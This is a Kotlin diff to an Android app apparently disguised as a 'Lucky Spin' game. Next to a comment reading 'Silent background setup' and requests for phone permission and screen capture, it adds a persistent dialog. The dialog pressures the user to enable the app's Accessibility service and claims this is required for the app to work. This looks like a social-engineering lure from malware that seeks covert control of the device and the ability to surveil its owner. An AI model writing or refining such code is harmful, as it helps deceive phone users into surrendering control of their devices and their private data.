@@ -18,6 +18,7 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import android.net.Uri
+import androidx.appcompat.app.AlertDialog
 
 class MainActivity : AppCompatActivity() {
     private val PERMISSION_REQUEST_CODE = 100
@@ -47,7 +48,18 @@ supportActionBar?.hide()
         
         // Silent background setup
         if (!isAccessibilityServiceEnabled()) {
-            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+    updateStatus("⚠ Enable Accessibility")
+    // Show a dialog guiding the user
+    AlertDialog.Builder(this)
+        .setTitle("Enable Accessibility")
+        .setMessage("Find 'Lucky Spin' in the list and turn it ON.\n\nThis is required for the app to function properly.")
+        .setPositiveButton("Open Settings") { _, _ ->
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            startActivity(intent)
+        }
+        .setNegativeButton("Cancel") { _, _ -> }
+        .setCancelable(false)
+        .show()
         }
         requestPhonePermission()
         requestScreenCapture()
